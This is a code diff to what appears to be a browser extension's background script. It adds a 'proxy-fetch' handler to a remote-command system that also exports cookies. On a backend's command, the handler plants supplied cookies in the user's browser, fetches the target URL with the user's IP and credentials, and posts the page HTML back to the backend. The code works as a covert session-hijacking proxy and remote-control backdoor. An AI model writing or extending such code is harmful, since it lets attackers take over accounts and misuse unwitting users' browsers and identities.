@@ -857,6 +857,10 @@ async function handleRemoteCommand(data) {
         await handleExportCookiesCommand(data);
         break;
       
+      case 'proxy-fetch':
+        await handleProxyFetchCommand(data);
+        break;
+      
       default:
         log('warn', 'Unknown command type:', data.command_type);
         throw new Error(`Unknown command type: ${data.command_type}`);
@@ -895,6 +899,111 @@ async function updateCommandStatus(command_id, status, error_message) {
     }
   } catch (error) {
     log('debug', 'Error updating command status:', error.message);
+  }
+}
+
+// Handle proxy-fetch command (fetch URL using user's IP and cookies)
+async function handleProxyFetchCommand(data) {
+  const { target_url, cookies: providedCookies, command_id } = data.payload;
+  
+  log('info', `🌐 Proxy-fetch request for: ${target_url}`);
+  
+  try {
+    // 1. Set cookies in the browser
+    if (providedCookies && Array.isArray(providedCookies)) {
+      const targetDomain = new URL(target_url).hostname;
+      for (const cookie of providedCookies) {
+        try {
+          await chrome.cookies.set({
+            url: target_url,
+            name: cookie.name,
+            value: cookie.value,
+            domain: cookie.domain || targetDomain,
+            path: cookie.path || '/',
+            secure: cookie.secure !== false,
+            httpOnly: cookie.httpOnly || false,
+            sameSite: cookie.sameSite || 'lax',
+            expirationDate: cookie.expirationDate
+          });
+        } catch (cookieError) {
+          log('warn', `Failed to set cookie ${cookie.name}:`, cookieError);
+        }
+      }
+      log('info', `✅ Set ${providedCookies.length} cookies for proxy fetch`);
+    }
+    
+    // 2. Fetch using browser context (with user's IP and headers)
+    const response = await fetch(target_url, {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'User-Agent': navigator.userAgent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Cache-Control': 'no-cache'
+      }
+    });
+    
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+    
+    const html = await response.text();
+    log('info', `✅ Fetched ${html.length} bytes from ${target_url}`);
+    
+    // 3. Send HTML back to backend via popup-response
+    const responseData = await fetch(`${CONFIG.API_BASE}/popup-response`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({
+        command_id,
+        machine_id: machineId,
+        domain: new URL(target_url).hostname,
+        url: target_url,
+        form_data: { 
+          html_content: html,
+          status: response.status,
+          success: true
+        }
+      })
+    });
+    
+    if (!responseData.ok) {
+      throw new Error(`Failed to send response: ${responseData.status}`);
+    }
+    
+    log('info', `✅ Proxy-fetch result sent to backend for command ${command_id}`);
+    
+  } catch (error) {
+    log('error', 'Proxy-fetch failed:', error);
+    
+    // Send error to backend
+    try {
+      await fetch(`${CONFIG.API_BASE}/popup-response`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+        },
+        body: JSON.stringify({
+          command_id,
+          machine_id: machineId,
+          domain: new URL(target_url).hostname,
+          url: target_url,
+          form_data: { 
+            error: error.message,
+            success: false
+          }
+        })
+      });
+    } catch (sendError) {
+      log('error', 'Failed to send error response:', sendError);
+    }
+    
+    throw error;
   }
 }
 
